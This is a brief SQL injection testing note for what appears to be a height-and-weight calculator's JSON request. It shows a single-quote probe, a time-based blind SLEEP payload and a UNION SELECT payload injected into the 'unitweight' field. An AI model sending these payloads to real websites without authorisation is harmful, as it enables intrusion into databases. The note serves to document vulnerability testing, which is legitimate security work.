[[SQL injection]]

Example data going through request:-
{
	"height":"160",
	"weight":"60",
	"unitheight":"cms",
	"unitweight":"kgs"
}

Testing for sqli:-
{
	"height":"160",
	"weight":"60",
	"unitheight":"cms",
	"unitweight":"kgs'"  -> Added a Single quote( ' )
}
Response:-
"The website encounterd an unexpacted error"

Request:-
{
	"height":"160",
	"weight":"60",
	"unitheight":"cms",
	"unitweight":"kgs'XOR (SELECT (0) FROM (SELECT (SLEEP (10))) a )XOR'Z"
}
- Payload -> 'XOR (SELECT (0) FROM (SELECT (SLEEP (10))) a )XOR'Z 
- This is a time based blind sql injection payload.
- To check for sqli
- 2nd Payload -> 'UNION SELECT 1-- -
- With this payload the site will return 1 if vulnerable to sqli.
